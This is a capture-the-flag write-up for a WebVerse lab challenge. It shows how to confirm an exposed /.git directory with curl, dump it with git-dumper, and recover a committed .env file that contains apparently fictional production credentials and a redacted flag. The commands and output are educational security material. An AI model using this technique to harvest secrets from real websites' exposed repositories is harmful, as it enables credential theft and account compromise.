---
source: WebVerse
title: Loop & Roam Records
difficulty: easy
tags: git 
summary: An accidental git commit left secrets for anyone to view. A tool like git-dumper can pull down the commits and rifled through to find the flag.
target: https://dashboard.webverselabs-pro.com/challenges/b-side
---

! Loop & Roam was founded in a Detroit garage in 2011 by a bassist named Jovan who got tired of touring and wanted to put out his friends' records. The site is maintained by Aphra, a contract designer who was learning git when she built it. One night in February 2024 she committed a `.env` with prod credentials, noticed an hour later, ran `git rm .env`, and pushed. The deploy script `rsync`s the working tree, including the `.git/` directory, to the public web root. 

## [01] Confirming .git Exists

From our briefing, we saw the web designer had accidentally commited the .env file. My first step was to verify this still exists. We can curl the `/.git` endpoint to check -  

```bash
$ curl https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/

<html>
<head><title>Index of /.git/</title></head>
<body>
<h1>Index of /.git/</h1><hr><pre>
<a href="branches/">branches/</a>                                          15-Nov-2026 19:52                   -
<a href="hooks/">hooks/</a>                                             15-Nov-2026 19:52                   -
<a href="info/">info/</a>                                              15-Nov-2026 19:52                   -
<a href="logs/">logs/</a>                                              15-Nov-2026 19:52                   -
<a href="objects/">objects/</a>                                           15-Nov-2026 19:52                   -
<a href="refs/">refs/</a>                                              15-Nov-2026 19:52                   -
<a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a>                                     15-Nov-2026 19:52                  57
<a href="config">config</a>                                             15-Nov-2026 19:52                 178
<a href="description">description</a>                                        15-Nov-2026 19:52                  73
<a href="HEAD">HEAD</a>                                               15-Nov-2026 19:52                  21
<a href="index">index</a>                                              15-Nov-2026 19:52                1.0K
</pre><hr><script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a5b0da41deb2cbed',t:'MTc5NDc3MjkzNQ=='};var l=window.parent.location,o;try{o=new URL(l.origin).origin}catch(e){try{o=new URL(new URL(l.href).origin).origin}catch(e){o=''}}var u='/cdn-cgi/challenge-platform/scripts/jsd/main.js?ray=a5b0da41deb2cbed',a=document.createElement('script');a.src=o?new URL(u,o).href:u;document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
```

And we have it. Next step is to use a tool like [git-dumper](https://github.com/arthaud/git-dumper) so we can investigate the logs.

```bash
$ python3 gitdumper.py https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/ ~/ctf/webverse/lrr

/home/grehaus/venv/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (7.7.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[-] Testing https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/HEAD [200]
[-] Testing https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/ [200]
[-] Fetching .git recursively
[-] Fetching https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/ [200]
---snip---
```

We now have the git history, we can investigate more.

## [02] Investigating git logs

Now we need to navigate to the directory we told git-dumper to store all the logs. We can then run `git log` to see the previous commits - 
```bash
commit 438b795c2f8f930acf2d4e75121fa47249c4e1d7 (HEAD -> main)
Author: Aphra Vidler <aphra@looproam.records>
Date:   Mon Feb 12 19:48:00 2024 +0000

    readme: full pages list, deploy notes, style constraints

commit 6d2d52a3a484db7478cba47281d730d05a2ab7ec
Author: Aphra Vidler <aphra@looproam.records>
Date:   Sat Feb 10 11:05:00 2024 +0000

    content: tour + store pages, all five routes wired

commit f923b35dad7682c87de228595c4217951e6a821f
Author: Aphra Vidler <aphra@looproam.records>
Date:   Thu Feb 8 16:22:00 2024 +0000

    content: roster + releases pages, wire routes

commit d9304190e01ac4a1981bdf9d3d5de1cb8967e55c
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 23:08:00 2024 +0000

    oops: remove .env from tracking + add .gitignore (DO NOT commit secrets)

commit 77933b93c55f65fd2933833e8e99a5ce6723ed08
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 22:41:00 2024 +0000

    wip: wire up prod env file (TODO gitignore before next push)

commit a8624ef75cafd67365f146783001aa521adcadf8
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 11:08:00 2024 +0000

    home: hero with single-of-the-week, tour strip, 8-tile roster grid

commit a71ace4684057a5198eb9ce73dd1429bb4acc29d
Author: Aphra Vidler <aphra@looproam.records>
Date:   Mon Feb 5 18:41:00 2024 +0000

    templates: full base layout (sticky nav, four-col footer)

commit f4c75a9e09ffb59ff9accf3a7af5633bb010e674
Author: Aphra Vidler <aphra@looproam.records>
Date:   Mon Feb 5 15:22:00 2024 +0000

    style: design system (palette, type scale, layout primitives)
---snip---
```

There are quite a few here, but commit `77933b93c55f65fd2933833e8e99a5ce6723ed08` stands out. The commit states it removed the .env file and states not to commit secrets. We can view this commit with `git show <commit ID>`.

```bash
commit 77933b93c55f65fd2933833e8e99a5ce6723ed08
Author: Aphra Vidler <aphra@looproam.records>
Date:   Tue Feb 6 22:41:00 2024 +0000

    wip: wire up prod env file (TODO gitignore before next push)

diff --git a/.env b/.env
new file mode 100644
index 0000000..6b3a7f6
--- /dev/null
+++ b/.env
@@ -0,0 +1,26 @@
+# Production environment for looproam-site
+# TODO(aphra): move to env vault before next deploy
+NODE_ENV=production
+
+# Postgres — orders + inventory
+DATABASE_URL=postgres://looproam:Pq7d2-vT83-bWuM@db.internal.looproam.records:5432/looproam_orders
+
+# Shopify — store integration
+SHOPIFY_API_KEY=shp_a8e72b3f4d
+SHOPIFY_API_SECRET=shp_secret_3c9f12a47e6b1d
+
+# Stripe — card-not-present from the merch table
+STRIPE_SECRET_KEY=sk_live_4920ab48f5d2e9a4c0
+STRIPE_WEBHOOK_SECRET=whsec_2c7e9f48a31db5
+
+# Mailgun — order receipts + mailing list
+MAILGUN_DOMAIN=mg.looproam.records
+MAILGUN_API_KEY=key-7f4ea9c82b3d0a1e6c5d8e7f
+
+# Bandcamp OAuth — for the artist-payout reconciliation pipeline
+BANDCAMP_OAUTH_TOKEN=bc-oauth-49281acd-deeb-4f23-94c1
+
+# Internal reconciliation reference — Jovan keys monthly payouts off this
+INTERNAL_REF=WEBVERSE{xxxxxxxx}
```

> Want to hack the web with me? Come join me at [WebVerse Pro](https://dashboard.webverselabs-pro.com/dashboard)
